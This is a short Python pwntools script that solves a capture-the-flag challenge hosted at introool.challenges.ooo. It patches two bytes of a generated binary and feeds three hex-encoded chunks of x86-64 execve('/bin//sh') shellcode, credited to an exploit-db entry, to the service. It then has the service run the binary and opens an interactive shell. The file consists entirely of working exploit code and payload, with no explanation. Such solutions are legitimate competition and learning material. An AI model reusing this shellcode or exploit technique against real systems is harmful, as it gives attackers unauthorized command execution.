from pwn import *
import base64

OFFSET1 = "7c"
PATCH1 = "eb"

OFFSET2 = "7d"
PATCH2 = "46"

context.log_level = "DEBUG"

p = remote("introool.challenges.ooo", 4242)

# Insert NOP sled byte in hex (e.g., "90"). The byte must be >= 0x80.
p.recvuntil("> ")
p.sendline("90")

# Insert size of sled in hex (e.g., "200"). Valid range is [0x80, 0x800].
p.recvuntil("> ")
p.sendline("80")

# Insert offset to patch in hex (e.g., "909"):
p.recvuntil("): ")
p.sendline(str(OFFSET1))

# Insert value to patch with in hex (e.g., "90"):
p.recvuntil("): ")
p.sendline(PATCH1)

# Insert offset to patch in hex (e.g., "909"):
p.recvuntil("): ")
p.sendline(str(OFFSET2))

# Insert value to patch with in hex (e.g., "90"):
p.recvuntil("): ")
p.sendline(PATCH2)

# https://www.exploit-db.com/exploits/42179
A = "504831d24831f648"
B = "bb2f62696e2f2f73"
C = "6853545fb03b0f05"

# Insert your three ROP chain gadgets in hex (e.g., "baaaaaadc0000ffe").
p.recvuntil(").")
p.recvuntil("[1/3] > ")
p.sendline(A)
p.recvuntil("[2/3] > ")
p.sendline(B)
p.recvuntil("[3/3] > ")
p.sendline(C)

# Now what?
p.recvuntil("> ")
p.sendline("2")     # 1 to print out the ELF (in base64), 2 to execute it

p.interactive()

prog = base64.b64decode(p.recvall().strip())

success(f"received {len(prog)} bytes!")

with open("elf", "wb+") as f:
    f.write(prog)